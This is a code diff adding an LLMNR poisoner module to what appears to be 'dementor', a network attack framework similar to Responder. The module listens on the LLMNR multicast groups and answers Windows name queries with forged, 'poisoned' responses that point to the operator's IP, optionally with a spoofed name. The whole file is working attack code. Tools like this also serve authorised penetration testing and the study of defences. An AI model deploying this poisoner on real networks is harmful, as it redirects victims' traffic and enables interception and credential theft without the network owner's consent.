@@ -1,0 +1,127 @@
+import socket
+import struct
+
+from scapy.layers import llmnr, dns
+
+from dementor.protocols.mdns import build_dns_answer
+from dementor.servers import ThreadingUDPServer, ServerThread, BaseProtoHandler
+from dementor.config import SessionConfig, TomlConfig
+from dementor.logger import ProtocolLogger
+from dementor.filters import BlacklistConfigMixin, WhitelistConfigMixin, in_scope
+
+
+# --- Protocol Interface ---
+class LLMNRConfig(TomlConfig, BlacklistConfigMixin, WhitelistConfigMixin):
+    _section_ = "LLMNR"
+    _fields_ = (
+        [
+            ("llmnr_answer_name", "AnswerName", None),
+            ("llmnr_targets", "AnswerTo", None),
+        ]
+        + BlacklistConfigMixin._extra_fields_
+        + WhitelistConfigMixin._extra_fields_
+    )
+
+
+def apply_config(session: SessionConfig) -> None:
+    session.llmnr_config = TomlConfig.build_config(LLMNRConfig)
+    pass
+
+
+def create_server_threads(session: SessionConfig) -> list:
+    if not session.llmnr_enabled:
+        return []
+
+    return [ServerThread(session, LLMNRServer)]
+
+
+LLMNR_IPV4_ADDR = llmnr._LLMNR_IPv4_mcast_addr
+LLMNR_IPV6_ADDR = llmnr._LLMNR_IPv6_mcast_Addr
+
+
+class LLMNRPoisoner(BaseProtoHandler):
+    def proto_logger(self) -> ProtocolLogger:
+        return ProtocolLogger(
+            extra={
+                "protocol": "LLMNR",
+                "protocol_color": "light_sky_blue3",
+                "host": self.client_host,
+                "port": 5355,  # should be fixed
+            }
+        )
+
+    def handle_data(self, data: bytes, transport) -> None:
+        packet = llmnr.LLMNRQuery(data)
+        if packet.qdcount > 0:
+            host = self.client_host
+            config = self.config.llmnr_config
+            # query sent by windows client
+            for question in packet.qd:
+                # similar to mdns but here we don't have to check for .local
+                qname = question.qname.decode(errors="replace").removesuffix(".")
+                qtype = dns.dnsqtypes.get(question.qtype)
+
+                # Whitelist+Blacklist filters
+                if not in_scope(qname, config) or not in_scope(host, config):
+                    # REVISIT: maybe log ignored requests via option
+                    continue
+
+                self.logger.display(f"Query for [i]{qname}[/i] (type: {qtype})")
+                if self.config.analysis:
+                    continue
+
+                self.send_poisoned_answer(packet, question, transport)
+
+    def send_poisoned_answer(self, req, question: dns.DNSQR, transport) -> None:
+        # check if we can send a response
+        if question.qtype == 28 and not self.config.ipv6:
+            self.logger.highlight(
+                "Client requested AAAA record (IPv6) but local config does not "
+                "specify IPv6 address. Ignoring..."
+            )
+            return
+
+        if question.qtype == 1 and not self.config.ipv4:
+            self.logger.highlight(
+                "Client requested A record (IPv4) but local config does not "
+                "specify IPv4 address. Ignoring..."
+            )
+            return
+
+        # build response packet with our IP in answer RR
+        response = build_dns_answer(req.id, question, self.config)
+        response.qd = [question]  # question must be present
+
+        answer_name = self.config.llmnr_config.llmnr_answer_name
+        if answer_name:
+            response.an[0].rrname = answer_name
+
+        transport.sendto(response.build(), self.client_address)
+        text = f"Sent poisoned answer to {self.client_host}"
+        if answer_name:
+            text += f" ([i]spoofed name:[/i] {answer_name})"
+        self.logger.success(text)
+
+
+class LLMNRServer(ThreadingUDPServer):
+    default_port = 5355
+    default_handler_class = LLMNRPoisoner
+    service_name = "LLMNR"
+
+    def server_bind(self) -> None:
+        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.socket.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
+
+        if self.config.ipv4:
+            # join IPv4 mDNS multicast group
+            mreq = socket.inet_aton(LLMNR_IPV4_ADDR) + socket.inet_aton(
+                self.config.ipv4
+            )
+            self.socket.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
+
+        if self.config.ipv6:
+            mreq = socket.inet_pton(socket.AF_INET6, LLMNR_IPV6_ADDR)
+            mreq += struct.pack("@I", socket.if_nametoindex(self.config.interface))
+            self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_JOIN_GROUP, mreq)
+
+        super().server_bind()
